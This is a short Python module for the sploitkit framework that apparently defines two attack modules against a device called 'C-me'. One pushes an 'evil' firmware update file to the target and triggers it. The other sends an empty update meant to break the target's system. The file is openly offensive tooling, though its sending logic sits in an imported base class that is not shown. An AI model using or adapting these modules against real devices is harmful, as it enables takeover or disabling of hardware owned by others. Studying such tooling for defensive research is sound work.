# -*- coding: UTF-8 -*-
from sploitkit import *

from generic import CmeUpdateFunctionality


class FirmwareUpdate(CmeUpdateFunctionality):
    """
    Push an evil update to the target C-me and trigger it.
    
    Author:  Yannick Pasquazzo
    Email:   y.pasquazzo@hotmail.com
    Version: 1.0
    """
    config = Config({
        Option(
            'UPDATE_FILE',
            "evil update file to be pushed",
            True,
            transform=lambda s, v: Path(v),
        ): Path("0.7.15.zip"),
    })
    
    def run(self):
        self.send_update(self.config.get("UPDATE_FILE"))


class FirmwareDos(CmeUpdateFunctionality):
    """
    Push an empty update to break target C-me's system.
    
    Author:  Yannick Pasquazzo
    Email:   y.pasquazzo@hotmail.com
    Version: 1.0
    """
    
    def run(self):
        self.send_update()
